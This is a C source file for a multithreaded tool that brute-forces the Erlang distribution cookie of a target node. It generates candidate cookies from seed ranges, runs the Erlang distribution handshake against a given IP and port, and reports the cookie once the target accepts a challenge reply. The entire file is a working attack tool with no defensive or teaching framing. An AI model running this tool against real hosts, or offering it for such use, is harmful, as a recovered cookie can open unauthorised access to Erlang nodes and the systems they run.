#include <sys/socket.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <getopt.h>
#include <pthread.h>
#include <inttypes.h>
#include <sys/errno.h>
#include <signal.h>
#include <sys/queue.h>
#include <inttypes.h>
#include <assert.h>

#include "erldp.h"

static const char *target;
static int port;
static unsigned int interconnection_gap = 0UL;

struct interval {
  uint64_t start;
  uint64_t stop;
  float prob;
  TAILQ_ENTRY(interval) _next;
};
static TAILQ_HEAD(,interval) intervals;


static struct interval *parse_interval(char *arg) {
  struct interval *new_interval;
  char *comma;
  uint64_t start, stop;
  float prob;

  comma = strchr(arg, ',');
  if (!comma) return NULL;
  *comma = 0;

  start = strtoul(arg, NULL, 10);

  arg = comma+1;
  comma = strchr(arg, ',');
  if (!comma) return NULL;
  *comma = 0;

  stop = strtoul(arg, NULL, 10);

  arg = comma+1;
  prob = atof(arg);

  new_interval = malloc(sizeof(*new_interval));
  assert(new_interval != NULL);
  new_interval->start = start;
  new_interval->stop = stop;
  new_interval->prob = prob;

  return new_interval;
}

static volatile int quit = 0;
static volatile int finished = 0;

struct worker {
  pthread_t tid;
  int index;

  struct interval *current_interval;

  volatile uint32_t cumulative_seeds;
  volatile uint32_t cumulative_conns;
  volatile uint32_t cumulative_fails;
  volatile float cumulative_prob;
};

static int n_workers = 64;
static struct worker *workers;

static int read_exactly(int sd, void *ptr, size_t size) {
  size_t current;
  int ret;

  for (current = 0; current < size; ) {
    ret = read(sd, ptr + current, size - current);
    if (ret == -1) {
      fprintf(stderr, "could not read, '%s'\n", strerror(errno));
      return -1;
    }
    if (ret == 0) {
      return 0;
    }

    current += ret;
  }

  return current;
}

static int write_exactly(int sd, const void *ptr, size_t size) {
  size_t current;
  int ret;

  for (current = 0; current < size; ) {
    ret = write(sd, ptr + current, size - current);
    if (ret == -1) {
      fprintf(stderr, "could not write, '%s'\n", strerror(errno));
      return -1;
    }
    if (ret == 0) {
      fprintf(stderr, "remote disconnected\n");
      return 0;
    }

    current += ret;
  }

  return current;
}

static size_t read_msg(int sd, void *ptr, size_t size) {
  int ret;
  uint16_t length;

  ret = read_exactly(sd, &length, sizeof(length));
  if (ret != sizeof(length)) {
    return ret;
  }

  length = ntohs(length);
  if (length > size) {
    fprintf(stderr, "received message exceeds size of given buffer\n");
    return -1;
  }

  ret = read_exactly(sd, ptr, length);
  if (ret != length) {
    return ret;
  }

  return length;
}

static size_t write_msg(int sd, void *ptr, size_t size) {
  int ret;
  uint16_t length;

  if (size > 65535) {
    return -1;
  }

  length = (uint16_t) size;
  length = htons(length);

  ret = write_exactly(sd, &length, sizeof(length));
  if (ret != sizeof(length)) {
    return ret;
  }

  ret = write_exactly(sd, ptr, size);
  if (ret != size) {
    return ret;
  }

  return size;
}

static void hexdump(const void *ptr, size_t size) {
  const unsigned char *cptr = ptr;
  size_t i;

  for (i = 0; i < size; i++) {
    printf("%02x", cptr[i]);
  }

  printf("\n");
}

static void *worker_run(void *arg) {
  struct worker *w = arg;
  struct sockaddr_in addr;
  int ret;
  uint64_t seed, start, stop;
  int sd;
  uint64_t challenge;
  char cookie[20];
  uint8_t buffer[256];
  char send_name[64] = "n" "\x00\x05" "\x00\x03\x7f\xfc";
  size_t name_length;
  char send_challenge_reply[23] = "\x00\x15" "r" "\x00\x00\x00\x00";
  const int on = 1;

  name_length = snprintf(&send_name[7], 32, "bruteforce%04x@erldp", w->index);

  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr(target);
  addr.sin_port = htons(port);

  w->cumulative_prob = 0.0;

  for (; w->current_interval != NULL; w->current_interval = TAILQ_NEXT(w->current_interval, _next)) {
    start = w->current_interval->start + w->index;
    stop = w->current_interval->stop;

    for (seed = start; seed <= stop && !quit; seed += 1) {
      create_cookie(seed, cookie, sizeof(cookie));

      sd = socket(PF_INET, SOCK_STREAM, 0);
      assert(sd != -1);

      ret = setsockopt(sd, SOL_SOCKET, SO_REUSEPORT, &on, sizeof(on));
      assert(ret == 0);

      ret = connect(sd, (struct sockaddr *) &addr, sizeof(addr));
      if (ret != 0) {
        fprintf(stderr, "could not connect to target, '%s'\n", strerror(errno));
        quit = 1;
        return NULL;
      }

      w->cumulative_conns += 1;

      ret = write_msg(sd, send_name, 7 + name_length);
      if (ret != name_length + 7) {
        fprintf(stderr, "could not send complete send_name\n");
        quit = 1;
        return NULL;
      }

      ret = read_msg(sd, buffer, sizeof(buffer));
      if (ret == 0 || ret == -1) {
        fprintf(stderr, "could not receive send_status\n");
        quit = 1;
        return NULL;
      }

      if (ret == 4 && memcmp(buffer, "snok", 4) == 0) {
        w->cumulative_fails += 1;
        goto failed_handshake;
      }
      else if (ret != 3 || memcmp(buffer, "sok", 3) != 0) {
        fprintf(stderr, "invalid / unexpected message received, while awaiting send_status\n");
        printf("received :");
        hexdump(buffer, ret);
        quit = 1;
        return NULL;
      }

      ret = read_msg(sd, buffer, sizeof(buffer));
      if (ret == 0 || ret == -1) {
        fprintf(stderr, "could not receive send_challengen");
        quit = 1;
        return NULL;
      }

      if (ret < 11 || buffer[0] != 'n') {
        fprintf(stderr, "invalid / unexpected received, while awaiting send_challenge\n");
        printf("received :");
        hexdump(buffer, ret);
        quit = 1;
        return NULL;
      }

      challenge = (buffer[7]<<24) + (buffer[8]<<16) + (buffer[9]<<8) + (buffer[10]<<0);

      compute_response(sizeof(cookie), cookie, challenge, (uint8_t *) &send_challenge_reply[7]);

      ret = write_exactly(sd, send_challenge_reply, sizeof(send_challenge_reply));
      if (ret != sizeof(send_challenge_reply)) {
        fprintf(stderr, "could not send complete send_challenge_reply\n");
        quit = 1;
        return NULL;
      }

      w->cumulative_seeds += 1;

      ret = read_msg(sd, buffer, sizeof(buffer));
      if (ret == 17 && buffer[0] == 'a') {
        printf("\nfound cookie = %.*s\n", 20, cookie);
        quit = 1;
        return NULL;
      }

failed_handshake:
      shutdown(sd, SHUT_RDWR);
      close(sd);


      if (interconnection_gap) {
        usleep(interconnection_gap);
      }
    }

    w->cumulative_prob += w->current_interval->prob;
  }

  finished += 1;
  if (finished == n_workers) {
    quit = 1;
  }
  return NULL;
};


static void usage(const char *arg0) {
  fprintf(stderr, "usage: %s [--threads=<1-1024>] [--gap=<gap to sleep between each handshake for a thread, in microsec>] [--interval=<start>,<stop>,<prob> ...] <target IPv4> <target port>\n", arg0);
  fprintf(stderr, "  --threads=<1-1024>: defaults to 64\n");
  fprintf(stderr, "  --gap=<amount of microsec to sleep between each handshake attempt>: defaults to 0, no gap\n");
  fprintf(stderr, "  --interval=<start>,<stop>,<prob>. May be used multiple times \n");
  exit(1);
}

int main(int argc, char **argv) {
  int ret;
  int option_index = 0;
  int c;
  int i;
  uint64_t cumulative_conns;
  uint64_t last_cumulative_conns = 0;
  uint64_t delta_conns;
  uint64_t cumulative_seeds;
  uint64_t last_cumulative_seeds = 0;
  uint64_t delta_seeds;
  uint64_t cumulative_fails;
  uint64_t last_cumulative_fails = 0;
  uint64_t delta_fails;
  struct interval *new_interval;
  float cumulative_prob;

  TAILQ_INIT(&intervals);

  static struct option options[] = {
    {"gap", required_argument, 0, 'g'},
    {"help", 0, 0, 'h'},
    {"threads", required_argument, 0, 't'},
    {"interval", required_argument, 0, 'i'},
    {NULL, 0, 0, 0},
  };

  while (1) {
    c = getopt_long(argc, argv, "ht:g:i:", options, &option_index);
    if (c == -1) {
      break;
    }
    switch (c) {
    case 'g':
      interconnection_gap = atoi(optarg);
      break;
    case 'h':
      usage(argv[0]);
      break;
    case 't':
      n_workers = atoi(optarg);
      break;
    case 'i':
      new_interval = parse_interval(optarg);
      if (new_interval) {
        TAILQ_INSERT_HEAD(&intervals, new_interval, _next);
      }
      else {
        usage(argv[0]);
      }
      break; 
    }
  }

  if (optind + 2 != argc) {
    usage(argv[0]);
  }

  if (n_workers <= 0 || n_workers > 1024) {
    fprintf(stderr, "please provide a valid number of workers\n");
    exit(1);
  }


  target = argv[optind];
  port = atoi(argv[optind+1]);

  workers = calloc(n_workers, sizeof(*workers));
  assert(workers != NULL);


  for (i = 0; i < n_workers; i++) {
    workers[i].index = i;
    workers[i].current_interval = TAILQ_FIRST(&intervals);
    workers[i].cumulative_conns = 0;
    workers[i].cumulative_seeds = 0;
    workers[i].cumulative_fails = 0;

    ret = pthread_create(&workers[i].tid, NULL, worker_run, &workers[i]);
    assert(ret == 0);
  }




  while (!quit) {
    sleep(1);

    if (quit)
      break;

    cumulative_conns = 0;
    for (i = 0; i < n_workers; i++) {
      cumulative_conns += workers[i].cumulative_conns;
    }
    delta_conns = cumulative_conns - last_cumulative_conns;
    last_cumulative_conns = cumulative_conns;

    cumulative_seeds = 0;
    for (i = 0; i < n_workers; i++) {
      cumulative_seeds += workers[i].cumulative_seeds;
    }
    delta_seeds = cumulative_seeds - last_cumulative_seeds;
    last_cumulative_seeds = cumulative_seeds;

    cumulative_fails = 0;
    for (i = 0; i < n_workers; i++) {
      cumulative_fails += workers[i].cumulative_fails;
    }
    delta_fails = cumulative_fails - last_cumulative_fails;
    last_cumulative_fails = cumulative_fails;

    cumulative_prob = 0.0;
    for (i = 0; i < n_workers; i++) {
      cumulative_prob += workers[i].cumulative_prob;
    }
    cumulative_prob /= n_workers;

    printf("\r %" PRIu64 " seed/s (%" PRIu64 " conn/s, %" PRIu64 " fails/s)\t\t%2.5f%%", delta_seeds, delta_conns, delta_fails, 100.0*cumulative_prob);
    fflush(stdout);
  }

  for (i = 0; i < n_workers; i++) {
    pthread_join(workers[i].tid, NULL);
  }

  free(workers);
}
